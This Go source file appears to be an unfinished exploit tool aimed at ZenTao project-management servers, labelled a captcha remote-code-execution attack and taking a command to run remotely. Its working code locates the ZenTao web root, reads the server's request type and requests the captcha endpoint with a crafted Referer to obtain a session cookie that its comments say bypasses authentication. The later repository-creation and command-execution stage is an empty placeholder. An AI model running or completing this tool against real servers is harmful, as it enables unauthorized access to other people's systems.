// @File    :   main.go
// @Time    :   2023/01/17 14:25:22
// @Author  :   _0xf4n9x_
// @Version :   1.0
// @Contact :   fanq.xu@gmail.com

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/projectdiscovery/gologger"
)

const banner = `
####### #######  #####                                           ######   #####  ####### 
     #     #    #     #   ##   #####  #####  ####  #    #   ##   #     # #     # #       
    #      #    #        #  #  #    #   #   #    # #    #  #  #  #     # #       #       
   #       #    #       #    # #    #   #   #      ###### #    # ######  #       #####   
  #        #    #       ###### #####    #   #      #    # ###### #   #   #       #       
 #         #    #     # #    # #        #   #    # #    # #    # #    #  #     # #       
#######    #     #####  #    # #        #    ####  #    # #    # #     #  #####  #######
`

var (
	h           bool
	target      string
	proxyURL    string
	command     string
	stdin       bool
	baseURL     string // Zentao WebRoot Path
	requestType string
	zentaosid   string
)

func showBanner() {
	gologger.Print().Msgf("%s\n", banner)
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0
	return isPipedFromChrDev || isPipedFromFIFO
}

func init() {
	flag.BoolVar(&h, "h", false, "Show help.")
	flag.StringVar(&target, "t", "", "URL Target.")
	flag.StringVar(&proxyURL, "p", "", "Proxy URL.")
	flag.StringVar(&command, "c", "", "Input a command to remote command execution.")
	flag.Parse()

	stdin = hasStdin()

	showBanner()

	// -h flag or no flag, no stdin
	if h || (len(os.Args) == 1 && !stdin) {
		flag.Usage()
		os.Exit(0)
	}

	// no target and no stdin
	if target == "" && !stdin {
		gologger.Error().Msg("Target cannot be empty, use the -h flag to see the usage help.\n\n")
	}

	// stdin to target
	if stdin && target == "" {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			t := scanner.Text()
			if t == "" {
				continue
			}
			target = t
		}
	}

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		gologger.Error().Msg("This is not the correct URL format.\n\n")
	}

	// fmt.Printf("Target: " + target + "\n")
	// fmt.Printf("command: " + command + "\n")
	// fmt.Printf("proxyURL: " + proxyURL + "\n")
}

func main() {

	gologger.Print().Label("INFO").Msg("Target URL: " + target)

	exploit(target, command, proxyURL)
}

func exploit(target string, command string, proxyURL string) bool {
	client := resty.New()
	client.SetTimeout(15 * time.Second)

	if proxyURL != "" {
		gologger.Print().Label("INFO").Msg("ProxyURL: " + proxyURL)
		client.SetProxy(proxyURL)
	}

	// 1. 确定正确完整的Zentao baseURL
	u, _ := url.Parse(target)
	paths := []string{"/", "/zentao/"}

	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36"

	zentaoPath := false
	for _, path := range paths {
		uri := u.Path + path
		baseURL = u.Scheme + "://" + u.Host + strings.Replace(uri, "//", "/", -1)
		baseResp, _ := client.R().
			SetHeader("User-Agent", userAgent).
			Get(baseURL)

		if baseResp.StatusCode() == 200 && strings.Contains(string(baseResp.Body()), "/user-login") {
			zentaoPath = true
			break
		}
	}

	if !zentaoPath {
		baseURL = target
		gologger.Print().Label("WARN").Msg("Zentao WebRoot Path not found, target URL instead.")
	} else {
		gologger.Print().Label("INFO").Msg("Zentao WebRoot Path: " + baseURL)
	}

	// 2. 获取请求类型
	configURL := baseURL + "?mode=getconfig"
	configResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		Get(configURL)
	var jsonResp map[string]interface{}

	_ = json.Unmarshal(configResp.Body(), &jsonResp)
	if strings.Contains(jsonResp["requestType"].(string), "PATH_INFO") {
		requestType = "PATH_INFO"
		gologger.Print().Label("INFO").Msg("The value of requestType is: " + requestType)
	} else if strings.Contains(jsonResp["requestType"].(string), "GET") {
		requestType = "GET"
		gologger.Print().Label("INFO").Msg("The value of requestType is: " + requestType)
	} else {
		requestType = "PATH_INFO"
		gologger.Print().Label("WARN").Msg("No requestType is fetched, the default value PATH_INFO will be used.")
	}

	referURL := baseURL + "index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM="

	// 3. 获取Cookie绕过认证
	captchaURL := baseURL + getRequest("misc-captcha-user", requestType)
	captchaResp, _ := client.R().
		SetHeader("User-Agent", userAgent).
		SetHeader("Referer", referURL).
		Get(captchaURL)

	if captchaResp.StatusCode() == 200 && captchaResp.Header().Get("Content-Type") == "image/jpeg" {
		// zentaosid=a3adde2af35c975f042d0ee0fc349019; lang=zh-cn; device=desktop; theme=default
		cookies := string(captchaResp.Request.Header.Get("Cookie"))
		if strings.Contains(cookies, "zentaosid") {
			for _, v := range strings.Split(cookies, "; ") {
				if strings.Contains(v, "zentaosid") {
					zentaosid = strings.Split(v, "=")[1]
					gologger.Print().Label("INFO").Msg("zentaosid: " + zentaosid)
					break
				}
			}
		}
	}

	// 4. 创建仓库，并获取repoid

	return true
}

func getRequest(param string, requestType string) string {
	if requestType == "PATH_INFO" {
		return param
	} else if requestType == "GET" {
		params := strings.Split(param, "-")
		if len(params) < 2 {
			return param
		}

		uri := fmt.Sprintf("?m=%s&f=%s", params[0], params[1]) // ?m=misc&f=captcha
		params = params[2:]
		for i, aParam := range params {
			uri += fmt.Sprintf("&arg%d=%s", i+1, aParam)
		}
		return uri // ?m=misc&f=captcha&arg1=user
	}

	return param
}

func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}
